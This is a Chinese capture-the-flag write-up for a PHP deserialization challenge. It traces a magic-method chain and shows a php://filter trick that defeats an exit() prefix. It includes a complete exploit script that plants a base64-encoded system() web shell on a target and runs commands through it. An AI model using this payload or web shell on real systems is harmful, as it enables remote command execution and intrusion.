# 扩展题目-unser WriteUp

## 

### 1. 信息收集与题目分析

首先访问题目地址，查看源码：

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
Class FLAG{
    public $filename;
    public $content;
    public function __call($name,$arguments)
    {
        if(preg_match('/%|eval|exec|shell|system|passthru|assert|echo|print|`/i',$this->content))
        {
            die('feng不喜欢这些字符');
        }
        echo ("你该如何过死亡代码呢?");
        file_put_contents($this->filename,'<?php exit();'.$this->content);
    }
}
Class welcome{
    public $feng;
    public $you;
    public function __destruct()
    {
        if(isset($this->you)&&($this->you=='Welcome to join CTF web Team'))
        {
            echo "good";
            $this->feng->source;
        }
    }
    public function __invoke()
    {
        echo $this->feng;
    }
}
Class Geek{
    public $tou;
    public function __get($name)
    {
        $Challenge=$this->tou;
        return $Challenge();
    }
    public function __toString()
    {
        $this->tou->Getflag();
        return "Just do it";
    }
}
unserialize($_POST['data']);
?>
```

### 2. 代码分析

#### 2.1 程序入口点
- 程序通过 `unserialize($_POST['data'])` 接收POST数据并反序列化
- 这是典型的反序列化漏洞入口点

#### 2.2 类分析

**FLAG类**：
- 属性：`$filename` 和 `$content`
- 魔术方法：`__call($name, $arguments)`
- 功能：当调用不存在的方法时触发，会进行内容过滤并写入文件
- 关键点：`file_put_contents($this->filename, '<?php exit();'.$this->content)`

**welcome类**：
- 属性：`$feng` 和 `$you`
- 魔术方法：`__destruct()`
- 功能：对象销毁时触发，检查`$you`是否为指定字符串，然后访问`$feng->source`

**Geek类**：
- 属性：`$tou`
- 魔术方法：`__get($name)`
- 功能：访问不存在的属性时触发，会调用`$this->tou()`

### 3. 漏洞利用链分析

#### 3.1 魔术方法调用链
1. `welcome::__destruct()` - 对象销毁时触发
2. `$this->feng->source` - 访问Geek对象的source属性
3. `Geek::__get('source')` - source属性不存在，触发__get
4. `$Challenge()` - 调用`$this->tou`，即调用数组形式的回调函数
5. `FLAG::__call('source')` - FLAG对象没有source方法，触发__call

#### 3.2 利用链构造思路
```
welcome对象销毁 → 访问feng->source → Geek::__get → 调用tou() → FLAG::__call
```

### 4. 绕过死亡代码

#### 4.1 问题分析
FLAG类的`__call`方法会在文件内容前加上`<?php exit();`，这会导致我们的代码无法执行。

#### 4.2 绕过方法
使用PHP的伪协议过滤器：
```php
php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php
```

**原理**：
- `string.strip_tags`: 去除HTML和PHP标签
- `convert.base64-decode`: Base64解码
- `?>` 可以闭合前面的`<?php exit();`

### 5. 编写利用脚本

```php
<?php
/**
 * exploit.php
 * 
 * 用途：利用反序列化链＋php://filter 过滤器写入 shell.php，
 *       绕过死亡代码限制获取shell。
 */

// 1. 定义空壳类（与目标脚本中同名，保证序列化 class 名称一致）
class FLAG {
    public $filename;
    public $content;
}

class Geek {
    public $tou;
}

class welcome {
    public $feng;
    public $you;
}

// 2. 配置写入参数
// 使用 php://filter 过滤器绕过死亡代码
$filename = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php';
// Base64 编码后的 "<?php system($_GET['cmd']);?>"，并在前面加上 "?>" 用于闭合死代码
$content  = '?>PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=';

// 3. 构造对象链
$flagObj = new FLAG();
$flagObj->filename = $filename;
$flagObj->content = $content;

$geekObj = new Geek();
$geekObj->tou = [$flagObj, 'source'];  // 可调用数组，会触发 FLAG::__call('source')

$welcomeObj = new welcome();
$welcomeObj->feng = $geekObj;
$welcomeObj->you = 'Welcome to join CTF web Team';  // 必须是这个字符串

// 4. 序列化
$payload = serialize($welcomeObj);

// 5. 发送 POST 请求到目标
$target = 'http://110.42.47.169:35601/';
$ch = curl_init($target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, ['data' => $payload]);
$response = curl_exec($ch);
curl_close($ch);

// 6. 输出结果
echo "Payload 已发送。\n";
echo "响应内容：\n";
echo $response . "\n";
```

### 6. 利用过程详解

#### 6.1 执行流程
1. **反序列化触发**：服务器接收POST数据并反序列化welcome对象
2. **__destruct触发**：脚本执行结束时，welcome对象被销毁
3. **条件检查**：检查`$you`是否为`'Welcome to join CTF web Team'`
4. **属性访问**：访问`$feng->source`，由于source属性不存在，触发Geek的`__get`方法
5. **方法调用**：`__get`中调用`$this->tou()`，即`[$flagObj, 'source']()`
6. **__call触发**：FLAG对象没有source方法，触发`__call`方法
7. **文件写入**：`__call`方法执行文件写入操作

#### 6.2 关键技术点
- **PHP反序列化**：利用魔术方法构造调用链
- **伪协议过滤器**：绕过死亡代码限制
- **Base64编码**：绕过关键字过滤

### 7. 获取Shell

运行利用脚本后，访问：
```
http://110.42.47.169:35601/shell.php?cmd=ls
```

可以看到成功创建了shell.php文件，并能执行系统命令。

### 8. 获取Flag

通过shell执行命令查找flag：
```bash
# 查找flag文件
find / -name "flag*" 2>/dev/null

# 读取flag
cat /flag
```

**最终Flag**: `flag{Welcome_to_become_one_of_us}`

